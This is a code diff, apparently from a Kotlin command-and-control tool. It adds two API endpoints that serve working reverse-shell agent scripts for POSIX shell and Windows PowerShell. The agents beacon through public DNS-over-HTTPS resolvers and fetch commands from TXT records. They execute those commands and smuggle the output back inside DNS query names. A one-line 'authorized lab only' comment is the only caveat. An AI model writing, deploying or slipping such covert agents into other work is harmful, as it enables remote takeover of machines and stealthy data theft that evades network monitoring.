@@ -90,4 +90,52 @@ done
             else -> null
         }
     }
+
+    /** GET /api/dohshell/agent/posix — POSIX DoH reverse-shell agent script. */
+    fun dohPosix(): String = """
+#!/bin/sh
+# DoH reverse-shell agent (POSIX) — authorized lab only
+DOMAIN="${'$'}{DOMAIN:-qcli.local}"
+ID="$(hostname 2>/dev/null || echo doh-$(id -u))-$(head -c4 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+fetch() {
+  curl -s -m 10 "https://dns.google/resolve?name=${'$'}1.${'$'}DOMAIN&type=TXT" 2>/dev/null |
+    grep -o '"data":"[^"]*"' | head -1 | cut -d'"' -f4
+}
+beacon() {
+  curl -s -m 10 "https://cloudflare-dns.com/dns-query?name=${'$'}ID.${'$'}DOMAIN&type=A" >/dev/null 2>&1 ||
+  curl -s -m 10 "https://dns.google/resolve?name=${'$'}ID.${'$'}DOMAIN&type=A" >/dev/null 2>&1
+}
+while :; do
+  beacon
+  T=$(fetch cmd)
+  C=$(echo "${'$'}T" | sed -n 's/.*"cmd":"\([^"]*\)".*/\1/p')
+  if [ -n "${'$'}C" ]; then
+    R=$(sh -c "${'$'}C" 2>&1 | head -c 180 | tr -d '\n')
+    curl -s -m 10 "https://dns.google/resolve?name=$(echo "${'$'}R" | head -c 60 | tr -c 'a-z0-9' 'x').${'$'}DOMAIN&type=A" >/dev/null 2>&1
+  fi
+  sleep 45
+done
+""".trimIndent() + "\n"
+
+    /** GET /api/dohshell/agent/windows — Windows DoH reverse-shell agent (PowerShell). */
+    fun dohWindows(): String = """
+# DoH reverse-shell agent (Windows PowerShell) — authorized lab only
+${'$'}Domain = if (${'$'}env:DOH_DOMAIN) { ${'$'}env:DOH_DOMAIN } else { 'qcli.local' }
+${'$'}Id = "${'$'}env:COMPUTERNAME-" + (-join ((48..57) + (97..122) | Get-Random -Count 4 | % { [char]${'$'}_ }))
+${'$'}Doh = 'https://dns.google/resolve'
+while (${'$'}true) {
+  try {
+    Invoke-RestMethod -Uri "${'$'}Doh?name=${'$'}Id.${'$'}Domain&type=A" -TimeoutSec 10 | Out-Null
+    ${'$'}r = Invoke-RestMethod -Uri "${'$'}Doh?name=cmd.${'$'}Domain&type=TXT" -TimeoutSec 10
+    ${'$'}t = (${'$'}r.Answer | Where-Object { ${'$'}_.type -eq 16 } | Select-Object -First 1).data
+    if (${'$'}t -match '"cmd":"([^"]*)"') {
+      ${'$'}out = (Invoke-Expression ${'$'}Matches[1] 2>&1 | Out-String).Trim() -replace '[^a-zA-Z0-9]', ''
+      if (${'$'}out.Length -gt 0) {
+        Invoke-RestMethod -Uri "${'$'}Doh?name=${'$'}out.Substring(0, [Math]::Min(60, ${'$'}out.Length)).${'$'}Domain&type=A" -TimeoutSec 10 | Out-Null
+      }
+    }
+  } catch {}
+  Start-Sleep -Seconds 45
+}
+""".trimIndent() + "\n"
 }
